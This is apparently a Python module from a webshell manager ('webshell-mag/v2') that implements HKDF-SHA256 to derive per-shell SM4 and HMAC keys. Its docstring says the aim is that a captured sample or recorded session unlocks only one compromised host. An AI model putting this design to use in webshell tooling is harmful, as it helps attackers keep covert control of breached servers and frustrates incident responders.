"""HKDF-SHA256 (RFC 5869) — derives independent encryption / MAC keys.

A single fixed key for both directions (and for every deployment) is the
biggest weakness of the classic "one key, one IV, forever" webshell design:
one leaked sample unlocks the whole fleet and every recorded session.

Per-shell ``secret`` + per-shell ``salt`` mixed through HKDF gives us
  enc_key = okm[0:16]   (SM4-128)
  mac_key = okm[16:48]  (HMAC-SHA256, encrypt-then-MAC)
so a stolen payload only unlocks that one host, and the two keys are never
reused across purposes.
"""

from __future__ import annotations

import hashlib
import hmac
from functools import lru_cache

INFO = b"webshell-mag/v2/keys"
KEY_LEN = 48


class KDFError(ValueError):
    pass


def hkdf_sha256(ikm: bytes, salt: bytes, info: bytes = INFO, length: int = KEY_LEN) -> bytes:
    if not ikm:
        raise KDFError("empty input key material")
    if len(salt) > 255:
        raise KDFError("salt too long")
    prk = hmac.new(salt or b"\x00" * 32, ikm, hashlib.sha256).digest()
    okm = b""
    block = b""
    counter = 1
    while len(okm) < length:
        block = hmac.new(prk, block + info + bytes([counter]), hashlib.sha256).digest()
        okm += block
        counter += 1
    return okm[:length]


@lru_cache(maxsize=128)
def derive(secret_hex: str, salt_hex: str) -> tuple[bytes, bytes]:
    """(enc_key, mac_key) for one shell profile."""
    try:
        ikm = bytes.fromhex(secret_hex)
        salt = bytes.fromhex(salt_hex)
    except ValueError as exc:
        raise KDFError(f"secret/salt must be hex: {exc}") from exc
    if len(salt) != 16:
        raise KDFError(f"salt must be 16 bytes, got {len(salt)}")
    okm = hkdf_sha256(ikm, salt)
    return okm[:16], okm[16:]
